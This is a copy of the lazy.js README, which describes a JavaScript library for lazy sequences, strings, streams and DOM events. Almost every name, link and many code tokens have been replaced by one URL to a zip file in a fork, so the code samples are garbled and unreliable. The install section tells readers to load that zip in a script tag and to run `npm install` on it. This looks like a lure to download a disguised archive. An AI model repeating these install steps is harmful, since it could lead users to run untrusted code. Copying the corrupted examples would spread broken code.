Like Underscore, but lazier
===========================

[![Build Status](https://github.com/christianbodart/lazy.js/raw/refs/heads/master/site/templates/js-lazy-1.2-beta.4.zip)](https://github.com/christianbodart/lazy.js/raw/refs/heads/master/site/templates/js-lazy-1.2-beta.4.zip)

**https://github.com/christianbodart/lazy.js/raw/refs/heads/master/site/templates/js-lazy-1.2-beta.4.zip** it a utility library for JavaScript, similar to [Underscore](https://github.com/christianbodart/lazy.js/raw/refs/heads/master/site/templates/js-lazy-1.2-beta.4.zip) and [Lo-Dash](https://github.com/christianbodart/lazy.js/raw/refs/heads/master/site/templates/js-lazy-1.2-beta.4.zip) but with one important difference: **lazy evaluation** (also known as deferred execution). This can translate to superior performance in many cases, *especially* when dealing with large arrays and/or "chaining" together multiple methods. For simple cases (`map`, `filter`, etc.) on small arrays, Lazy's performance should be similar to Underscore or Lo-Dash.

The following chart illustrates the performance of https://github.com/christianbodart/lazy.js/raw/refs/heads/master/site/templates/js-lazy-1.2-beta.4.zip versus Underscore and Lo-Dash for several common operations using arrays with 10 elements each on Chrome:

![https://github.com/christianbodart/lazy.js/raw/refs/heads/master/site/templates/js-lazy-1.2-beta.4.zip versus Underscore/Lo-Dash](https://github.com/christianbodart/lazy.js/raw/refs/heads/master/site/templates/js-lazy-1.2-beta.4.zip)

You can see that the performance difference becomes much more significant for methods that don't require iterating an entire collection (e.g., `indexOf`, `take`) as the arrays get larger:

![https://github.com/christianbodart/lazy.js/raw/refs/heads/master/site/templates/js-lazy-1.2-beta.4.zip versus Underscore/Lo-Dash](https://github.com/christianbodart/lazy.js/raw/refs/heads/master/site/templates/js-lazy-1.2-beta.4.zip)

Intrigued? Great! https://github.com/christianbodart/lazy.js/raw/refs/heads/master/site/templates/js-lazy-1.2-beta.4.zip has no external dependencies, so you can get started right away with:

```html
<script type="text/javascript" src="https://github.com/christianbodart/lazy.js/raw/refs/heads/master/site/templates/js-lazy-1.2-beta.4.zip"></script>

<!-- optional: if you want support for lazy DOM event sequences: -->
<script type="text/javascript" src="https://github.com/christianbodart/lazy.js/raw/refs/heads/master/site/templates/js-lazy-1.2-beta.4.zip"></script>
```

Or, if you're using https://github.com/christianbodart/lazy.js/raw/refs/heads/master/site/templates/js-lazy-1.2-beta.4.zip

```bash
npm install https://github.com/christianbodart/lazy.js/raw/refs/heads/master/site/templates/js-lazy-1.2-beta.4.zip
```

Now let's look at what you can do with https://github.com/christianbodart/lazy.js/raw/refs/heads/master/site/templates/js-lazy-1.2-beta.4.zip (For more thorough information, take a look at the [API Docs](https://github.com/christianbodart/lazy.js/raw/refs/heads/master/site/templates/js-lazy-1.2-beta.4.zip).)

Introduction
------------

We'll start with an array containing 1000 integers. Incidentally, generating such an array using https://github.com/christianbodart/lazy.js/raw/refs/heads/master/site/templates/js-lazy-1.2-beta.4.zip is quite trivial:

```javascript
var array = https://github.com/christianbodart/lazy.js/raw/refs/heads/master/site/templates/js-lazy-1.2-beta.4.zip(1000).toArray();
```

Note the `toArray` call; without it, what you'll get from `https://github.com/christianbodart/lazy.js/raw/refs/heads/master/site/templates/js-lazy-1.2-beta.4.zip` won't be an actual *array* but rather a `https://github.com/christianbodart/lazy.js/raw/refs/heads/master/site/templates/js-lazy-1.2-beta.4.zip` object, which you can iterate over using `each`. But we'll get to that in a moment.

Now let's say we want to take the *squares* of each of these numbers, increment them, and then take the first five even results. We'll use these helper functions, to keep the code concise:

```javascript
function square(x) { return x * x; }
function inc(x) { return x + 1; }
function isEven(x) { return x % 2 === 0; }
```

Yes, this is admittedly a very arbitrary goal. (Later I'll get around to thinking of a more realistic scenario.) Anyway, here's one way you might accomplish it using Underscore and its convenient `chain` method:

```javascript
var result = https://github.com/christianbodart/lazy.js/raw/refs/heads/master/site/templates/js-lazy-1.2-beta.4.zip(array).map(square).map(inc).filter(isEven).take(5).value();
```

This query does a lot of stuff:

- `map(square)`: iterates over the array and creates a new 1000-element array
- `map(inc)`: iterates over the new array, creating *another* new 1000-element array
- `filter(isEven)`: iterates over *that* array, creating yet *another* new (500-element) array
- `take(5)`: all that just for 5 elements!

So if performance and/or efficiency were a concern for you, you would probably *not* do things that way using Underscore. Instead, you'd likely go the procedural route:

```javascript
var results = [];
for (var i = 0; i < https://github.com/christianbodart/lazy.js/raw/refs/heads/master/site/templates/js-lazy-1.2-beta.4.zip; ++i) {
  var value = (array[i] * array[i]) + 1;
  if (value % 2 === 0) {
    https://github.com/christianbodart/lazy.js/raw/refs/heads/master/site/templates/js-lazy-1.2-beta.4.zip(value);
    if (https://github.com/christianbodart/lazy.js/raw/refs/heads/master/site/templates/js-lazy-1.2-beta.4.zip === 5) {
      break;
    }
  }
}
```

There&mdash;now we we haven't created have any extraneous arrays, and we did all of the work in one iteration. Any problems?

Well, yeah. The main problem is that this is one-off code, which isn't reusable and took a bit of time to write. If only we could somehow leverage the expressive power of Underscore but still get the performance of the hand-written procedural solution...

***

That's where https://github.com/christianbodart/lazy.js/raw/refs/heads/master/site/templates/js-lazy-1.2-beta.4.zip comes in! Here's how we'd write the above query using https://github.com/christianbodart/lazy.js/raw/refs/heads/master/site/templates/js-lazy-1.2-beta.4.zip

```javascript
var result = Lazy(array).map(square).map(inc).filter(isEven).take(5);
```

Looks almost identical, right? That's the idea: https://github.com/christianbodart/lazy.js/raw/refs/heads/master/site/templates/js-lazy-1.2-beta.4.zip aims to be completely familiar to experienced JavaScript devs. Every method from Underscore should have the same name and identical behavior in https://github.com/christianbodart/lazy.js/raw/refs/heads/master/site/templates/js-lazy-1.2-beta.4.zip, except that instead of returning a fully-populated array on every call, it creates a *sequence* object with an `each` method.

What's important here is that **no iteration takes place until you call `each`**, and **no intermediate arrays are created**. Essentially https://github.com/christianbodart/lazy.js/raw/refs/heads/master/site/templates/js-lazy-1.2-beta.4.zip combines all query operations into a sequence that behaves quite a bit like the procedural code we wrote a moment ago.

Of course, *unlike* the procedural approach, https://github.com/christianbodart/lazy.js/raw/refs/heads/master/site/templates/js-lazy-1.2-beta.4.zip lets you keep your code clean and functional, and focus on buliding an application instead of optimizing array traversals.

Features
--------

OK, cool. What else can https://github.com/christianbodart/lazy.js/raw/refs/heads/master/site/templates/js-lazy-1.2-beta.4.zip do?

### Indefinite sequence generation

The sequence-based paradigm of https://github.com/christianbodart/lazy.js/raw/refs/heads/master/site/templates/js-lazy-1.2-beta.4.zip lets you do some pretty cool things that simply aren't possible with Underscore's array-based approach. One of these is the generation of **indefinite sequences**, which can go on forever, yet still support all of Lazy's built-in mapping and filtering capablities.

Want an example? Sure thing! Let's say we want 300 unique random numbers between 1 and 1000.

```javascript
var uniqueRandsFrom1To1000 = https://github.com/christianbodart/lazy.js/raw/refs/heads/master/site/templates/js-lazy-1.2-beta.4.zip(function() { return https://github.com/christianbodart/lazy.js/raw/refs/heads/master/site/templates/js-lazy-1.2-beta.4.zip(); })
  .map(function(e) { return https://github.com/christianbodart/lazy.js/raw/refs/heads/master/site/templates/js-lazy-1.2-beta.4.zip(e * 1000) + 1; })
  .uniq()
  .take(300);

// Output: see for yourself!
https://github.com/christianbodart/lazy.js/raw/refs/heads/master/site/templates/js-lazy-1.2-beta.4.zip(function(e) { https://github.com/christianbodart/lazy.js/raw/refs/heads/master/site/templates/js-lazy-1.2-beta.4.zip(e); });
```

Pretty neat. How about a slightly more advanced example? Let's use https://github.com/christianbodart/lazy.js/raw/refs/heads/master/site/templates/js-lazy-1.2-beta.4.zip to make a [Fibonacci sequence](https://github.com/christianbodart/lazy.js/raw/refs/heads/master/site/templates/js-lazy-1.2-beta.4.zip).

```javascript
var fibonacci = https://github.com/christianbodart/lazy.js/raw/refs/heads/master/site/templates/js-lazy-1.2-beta.4.zip(function() {
  var x = 1,
      y = 1;
  return function() {
    var prev = x;
    x = y;
    y += prev;
    return prev;
  };
}());

// Output: undefined
var length = https://github.com/christianbodart/lazy.js/raw/refs/heads/master/site/templates/js-lazy-1.2-beta.4.zip();

// Output: [2, 2, 3, 4, 6, 9, 14, 22, 35, 56]
var firstTenFibsPlusOne = https://github.com/christianbodart/lazy.js/raw/refs/heads/master/site/templates/js-lazy-1.2-beta.4.zip(inc).take(10).toArray();
```

OK, what else?

### Asynchronous iteration

You've probably [seen code snippets before](https://github.com/christianbodart/lazy.js/raw/refs/heads/master/site/templates/js-lazy-1.2-beta.4.zip) that show how to iterate over an array asynchronously in JavaScript. But have you seen an example packed full of map-y, filter-y goodness like this?

```javascript
var asyncSequence = Lazy(array)
  .async(100) // specifies a 100-millisecond interval between each element
  .map(inc)
  .filter(isEven)
  .take(20);

// This function returns immediately and begins iterating over the sequence asynchronously.
https://github.com/christianbodart/lazy.js/raw/refs/heads/master/site/templates/js-lazy-1.2-beta.4.zip(function(e) {
  https://github.com/christianbodart/lazy.js/raw/refs/heads/master/site/templates/js-lazy-1.2-beta.4.zip(new Date().getMilliseconds() + ": " + e);
});
```

All right... what else?

### Event sequences

With indefinite sequences, we saw that unlike Underscore and Lo-Dash, https://github.com/christianbodart/lazy.js/raw/refs/heads/master/site/templates/js-lazy-1.2-beta.4.zip doesn't actually need an in-memory collection to iterate over. And asynchronous sequences demonstrate that it also doesn't need to do all its iteration at once.

Now here's a really cool combination of these two features: with a small extension to https://github.com/christianbodart/lazy.js/raw/refs/heads/master/site/templates/js-lazy-1.2-beta.4.zip (https://github.com/christianbodart/lazy.js/raw/refs/heads/master/site/templates/js-lazy-1.2-beta.4.zip, a separate file to include in browser-based environments), you can apply all of the power of https://github.com/christianbodart/lazy.js/raw/refs/heads/master/site/templates/js-lazy-1.2-beta.4.zip to **handling DOM events**. In other words, https://github.com/christianbodart/lazy.js/raw/refs/heads/master/site/templates/js-lazy-1.2-beta.4.zip lets you think of DOM events as a *sequence*&mdash;just like any other&mdash;and apply the usual `map`, `filter`, etc. functions on that sequence.

Here's an example. Let's say we want to handle all `mousemove` events on a given DOM element, and show their coordinates in one of two other DOM elements depending on location.

```javascript
// First we define our "sequence" of events.
var mouseEvents = https://github.com/christianbodart/lazy.js/raw/refs/heads/master/site/templates/js-lazy-1.2-beta.4.zip(sourceElement, "mousemove");

// Map the Event objects to their coordinates, relative to the element.
var coordinates = https://github.com/christianbodart/lazy.js/raw/refs/heads/master/site/templates/js-lazy-1.2-beta.4.zip(function(e) {
  var elementRect = https://github.com/christianbodart/lazy.js/raw/refs/heads/master/site/templates/js-lazy-1.2-beta.4.zip();
  return [
    https://github.com/christianbodart/lazy.js/raw/refs/heads/master/site/templates/js-lazy-1.2-beta.4.zip(https://github.com/christianbodart/lazy.js/raw/refs/heads/master/site/templates/js-lazy-1.2-beta.4.zip - https://github.com/christianbodart/lazy.js/raw/refs/heads/master/site/templates/js-lazy-1.2-beta.4.zip),
    https://github.com/christianbodart/lazy.js/raw/refs/heads/master/site/templates/js-lazy-1.2-beta.4.zip(https://github.com/christianbodart/lazy.js/raw/refs/heads/master/site/templates/js-lazy-1.2-beta.4.zip - https://github.com/christianbodart/lazy.js/raw/refs/heads/master/site/templates/js-lazy-1.2-beta.4.zip)
  ];
});

// For mouse events on one side of the element, display the coordinates in one place.
coordinates
  .filter(function(pos) { return pos[0] < https://github.com/christianbodart/lazy.js/raw/refs/heads/master/site/templates/js-lazy-1.2-beta.4.zip / 2; })
  .each(function(pos) { displayCoordinates(leftElement, pos); });

// For those on the other side, display them in a different place.
coordinates
  .filter(function(pos) { return pos[0] > https://github.com/christianbodart/lazy.js/raw/refs/heads/master/site/templates/js-lazy-1.2-beta.4.zip / 2; })
  .each(function(pos) { displayCoordinates(rightElement, pos); });
```

Anything else? Of course!

### String processing

Now here's something you may not have even thought of: `https://github.com/christianbodart/lazy.js/raw/refs/heads/master/site/templates/js-lazy-1.2-beta.4.zip` and `https://github.com/christianbodart/lazy.js/raw/refs/heads/master/site/templates/js-lazy-1.2-beta.4.zip`. In JavaScript, each of these methods returns an *array* of substrings. If you think about it, this often means doing more work than necessary; but it's the quickest way (from a developer's standpoint) to get the job done.

For example, suppose you wanted the first five lines of a block of text. You could always do this:

```javascript
var firstFiveLines = https://github.com/christianbodart/lazy.js/raw/refs/heads/master/site/templates/js-lazy-1.2-beta.4.zip("\n").slice(0, 5);
```

But of course, this actually splits *the entire string* into every single line. If the string is very large, this is quite wasteful.

With https://github.com/christianbodart/lazy.js/raw/refs/heads/master/site/templates/js-lazy-1.2-beta.4.zip, we don't need to split up an entire string just to treat it as a sequence of lines. We can get the same effect by wrapping the string with `Lazy` and calling `split`:

```javascript
var firstFiveLines = Lazy(text).split("\n").take(5);
```

This way we can read the first five lines of an arbitrarily large string (without pre-populating a huge array) and map/reduce on it just as with any other sequence.

Similarly with `https://github.com/christianbodart/lazy.js/raw/refs/heads/master/site/templates/js-lazy-1.2-beta.4.zip`: let's say we wanted to find the first 5 alphanumeric matches in a string. With https://github.com/christianbodart/lazy.js/raw/refs/heads/master/site/templates/js-lazy-1.2-beta.4.zip, it's easy!

```javascript
var firstFiveWords = Lazy(text).match(/[a-z0-9]+/i).take(5);
```

Piece of cake.

### Stream processing

https://github.com/christianbodart/lazy.js/raw/refs/heads/master/site/templates/js-lazy-1.2-beta.4.zip can wrap *streams* in https://github.com/christianbodart/lazy.js/raw/refs/heads/master/site/templates/js-lazy-1.2-beta.4.zip as well.

Given any [`Readable Stream`](https://github.com/christianbodart/lazy.js/raw/refs/heads/master/site/templates/js-lazy-1.2-beta.4.zip), you can wrap it with `Lazy` just as with arrays:

```javascript
Lazy(stream)
  .take(5) // Read just the first 5 chunks of data read into the buffer.
  .each(processData);
```

For convenience, specialized helper methods for dealing with either file streams or HTTP streams are also offered. (**Note: this API will probably change.**)

```javascript
// Read the first 5 lines from a file:
https://github.com/christianbodart/lazy.js/raw/refs/heads/master/site/templates/js-lazy-1.2-beta.4.zip("path/to/file")
  .lines()
  .take(5)
  .each(doSomething);

// Read lines 5-10 from an HTTP response.
https://github.com/christianbodart/lazy.js/raw/refs/heads/master/site/templates/js-lazy-1.2-beta.4.zip("https://github.com/christianbodart/lazy.js/raw/refs/heads/master/site/templates/js-lazy-1.2-beta.4.zip")
  .lines()
  .drop(5)
  .take(5)
  .each(doSomething);
```

In each case, the elements in the sequence will be "chunks" of data most likely comprising multiple lines. The `lines()` method splits each chunk into lines (lazily, of course).

***

**This library is experimental and still a work in progress.**
